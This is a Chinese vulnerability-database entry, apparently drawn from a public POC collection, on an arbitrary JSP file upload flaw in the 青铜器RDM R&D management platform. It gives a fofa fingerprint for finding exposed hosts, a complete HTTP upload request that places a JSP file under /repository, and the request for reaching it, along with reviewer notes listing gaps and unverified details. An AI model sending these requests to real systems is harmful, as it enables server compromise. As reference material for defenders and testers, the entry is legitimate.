---
source: "wy876 漏洞文库"
title: "青铜器RDM upload文件上传"
product: "青铜器RDM"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "未知版本，JSP可执行repository目录、分块大小规则"
prerequisites: "请求带JSESSIONID"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/lz5wvm37m8hz8p64"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E9%9D%92%E9%93%9C%E5%99%A8RDM/%E9%9D%92%E9%93%9C%E5%99%A8RDM%E7%A0%94%E5%8F%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0upload%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/images/rdm.ico\""
fofa_unverified: "body="
id: "vw-db28fffdfc619f40cda8d2b2"
entity_id: "ve-db28fffdfc619f40cda8d2b2"
schema_version: "1"
---

# 青铜器RDM upload文件上传

## 条目说明

- 对象与具体问题：青铜器RDM；upload文件上传
- 版本、配置及部署条件：未知版本，JSP可执行repository目录、分块大小规则
- 认证与权限前提：请求带JSESSIONID
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Base64 dir/name表示repository/demo.jsp，不是加密，表单poc.jsp与query命名优先级需说明
- size7000与实际小文件不符，分块完成条件未说明；000000000目录来源未知
- 返回/执行缺失，静态Cookie和Content-Length；不得视为匿名RCE
- 缺安全版本与清理，HTML噪声

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行；命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
深圳市青铜器软件系统有限公司,创业团队一直专注于提供产品创新和研发管理整体解决方案。公司在深入研究企业研发管理信息化需求的基础上，开发出针对完全拥有自主知识产权的研发管理软件RDM系列版本。青铜器RDM研发管理平台upload存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 青铜器RDM研发管理平台

## 三、资产测绘
+ fofa`body="/images/rdm.ico"`
+ 特征


## 四、漏洞复现
```http
POST /upload?dir=cmVwb3NpdG9yeQ==&name=ZGVtby5qc3A=&start=0&size=7000 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Cookie: JSESSIONID=A******************************A
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="file"; filename="poc.jsp"
Content-Type: application/octet-stream

<%out.println("1234");%>
--00content0boundary00
Content-Disposition: form-data; name="Submit"

Go
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 260；静态长度已移除，应由客户端根据最终请求体的字节数生成。


文件上传位置

```http
GET /repository/000000000/demo.jsp HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lz5wvm37m8hz8p64>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
